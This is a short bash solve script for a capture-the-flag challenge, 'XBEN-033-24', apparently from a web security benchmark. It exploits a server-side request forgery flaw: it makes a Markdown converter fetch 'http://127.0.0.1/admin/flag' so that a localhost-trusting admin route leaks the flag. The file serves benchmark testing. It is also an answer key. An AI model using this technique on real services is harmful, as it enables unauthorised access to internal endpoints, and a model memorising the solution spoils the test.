#!/usr/bin/env bash
# XBEN-033-24 — "Markdown to HTML" (tags: ssrf)
#
# The converter fetches a URL server-side and renders what comes back. The admin
# routes trust `request.remote_addr == 127.0.0.1`, and a request the server
# makes to itself is from 127.0.0.1. So the converter reads the admin page on
# our behalf and renders the flag into its own output.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben033-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "input[name=url]" "http://127.0.0.1/admin/flag" \
    --session "$SESSION" >/dev/null
"$H5I" browser click --role button --name "Convert" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
